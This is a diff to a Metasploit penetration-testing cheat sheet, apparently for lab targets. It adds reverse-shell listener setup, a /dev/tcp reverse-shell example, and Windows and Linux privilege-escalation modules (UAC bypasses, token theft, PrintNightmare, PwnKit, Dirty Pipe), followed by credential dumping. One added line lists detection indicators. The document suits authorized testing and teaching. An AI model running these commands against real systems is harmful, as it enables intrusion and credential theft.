@@ -14,6 +14,8 @@ sudo msfdb init && msfconsole -q
 - [Validate & spray credentials over SMB](#validate--spray-credentials-over-smb)
 - [Get a shell / lateral movement](#get-a-shell--lateral-movement)
 - [Meterpreter essentials](#meterpreter-essentials)
+- [Catch a shell with just a listener](#catch-a-shell-with-just-a-listener)
+- [Privilege escalation](#privilege-escalation)
 - [Pivoting through a session](#pivoting-through-a-session)
 - [AD / Domain Controller attacks](#ad--domain-controller-attacks)
 - [Payload generation (msfvenom)](#payload-generation-msfvenom)
@@ -109,6 +111,79 @@ load kiwi ; creds_all ; lsa_dump_secrets           # Mimikatz: memory creds / LS
 load incognito ; list_tokens -u ; impersonate_token 'VELLUM\\Administrator'
 ```
 
+## Catch a shell with just a listener
+
+Yes — `exploit/multi/handler` is a standalone listener. Deliver the payload any other way (a dropped [msfvenom](#payload-generation-msfvenom) binary, a web exploit, a manual reverse shell) and the handler catches the session. `PAYLOAD`/`LHOST`/`LPORT` must match what runs on the target.
+
+```text
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp   # must match the delivered payload
+set LHOST 10.10.14.5
+set LPORT 443
+set ExitOnSession false        # keep listening after the first catch
+exploit -j                     # run as a background job; catches multiple sessions
+```
+
+For a plain (non-Meterpreter) reverse shell — e.g. `bash -i >& /dev/tcp/...` — use `PAYLOAD generic/shell_reverse_tcp` (or just `nc -lvnp 443`). Upgrade a caught raw shell to Meterpreter with `sessions -u <id>`.
+
+## Privilege escalation
+
+From a user session → local admin/SYSTEM (Windows) or root (Linux). **Always start with the suggester**, which checks the session against local-exploit modules:
+
+```text
+meterpreter > getuid                        # confirm you're not already SYSTEM/root
+meterpreter > background
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+```
+
+```text
+# expected output — a shortlist of modules that *may* work, check each:
+[*] 10.129.1.18 - Collecting local exploits for x64/windows...
+[+] 10.129.1.18 - exploit/windows/local/cve_2020_0796_smbghost: The target appears to be vulnerable.
+[+] 10.129.1.18 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
+```
+
+### Windows
+
+```text
+# Token / SYSTEM — try these first, they're reliable and quiet-ish
+getsystem                                   # local admin -> SYSTEM via token duplication
+load incognito ; impersonate_token 'NT AUTHORITY\\SYSTEM'   # steal an available SYSTEM token
+
+# UAC bypass (you're a local admin but in a medium-integrity shell)
+use exploit/windows/local/bypassuac_fodhelper      # ...also: _sdclt, _eventvwr, bypassuac_injection
+set SESSION 1 ; run                                 # -> high-integrity session, then getsystem
+
+# SeImpersonate/SeAssignPrimaryToken present (service accts / IIS / MSSQL) -> Potato family
+getprivs                                            # look for SeImpersonatePrivilege
+use exploit/windows/local/ms16_075_reflection       # named-pipe token impersonation -> SYSTEM
+
+# Service / config misconfigs
+use exploit/windows/local/service_permissions       # weak service ACL -> replace binary
+use exploit/windows/local/trusted_service_path      # unquoted service path
+use exploit/windows/local/always_install_elevated   # AlwaysInstallElevated MSI policy
+
+# Kernel LPEs (from the suggester) — can bluescreen, use last
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+use exploit/windows/local/cve_2020_0796_smbghost
+use exploit/windows/local/cve_2021_1675_printnightmare
+```
+
+### Linux
+
+```text
+use post/multi/recon/local_exploit_suggester ; set SESSION 2 ; run
+
+use exploit/linux/local/cve_2021_4034_pwnkit        # PwnKit (pkexec) — near-universal 2009–2022
+use exploit/linux/local/sudo_baron_samedit          # CVE-2021-3156, sudo < 1.9.5p2
+use exploit/linux/local/cve_2022_0847_dirtypipe     # Dirty Pipe, kernel 5.8–5.16
+use exploit/linux/local/polkit_dbus_auth_bypass
+```
+
+After escalating: `getuid` to confirm, then `hashdump` / `load kiwi` (Windows) or loot `/etc/shadow` and keys (Linux). Prefer the misconfig/token paths over kernel exploits on client boxes — kernel LPEs can crash the host. Deeper manual vectors and the "why" for each live in the dedicated notes: [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md) and [Linux Enumeration & Privilege Escalation](../Linux/Enumeration%20%26%20Privilege%20Escalation.md).
+
 ## Pivoting through a session
 
 ```text
@@ -165,6 +240,7 @@ run
 - **psexec module:** service creation (**7045**), `ADMIN$` write, named-pipe activity — same signature as Impacket psexec.
 - **smb_login spraying:** a burst of **4625** (with occasional **4624**) across many hosts; account lockout policy + alerting catches it.
 - **Meterpreter:** frequently in-memory; watch for reverse_tcp beacons, `migrate`/`getsystem` token manipulation, and injected threads. EDR + Sysmon (process creation / image load / CreateRemoteThread) cover most.
+- **Privilege escalation:** UAC-bypass modules spawn `fodhelper.exe`/`sdclt.exe`/`eventvwr.exe` with a child shell and leave auto-elevate registry writes (Sysmon 13); Potato/`ms16_075` abuse named-pipe impersonation (**4624** logon type 9 / token events); kernel LPEs often crash or patch-gap — patch management + `local_exploit_suggester`'s own CVE list is your remediation checklist.
 - **DCSync / Kerberoast:** detections as in [Attacking the Domain Controller → Detection & defense](../AD/Attacking%20the%20Domain%20Controller.md#detection--defense-write-this-in-the-report) (4662 replication GUIDs; 4769 RC4 / 4768 no-preauth).
 
 ## References
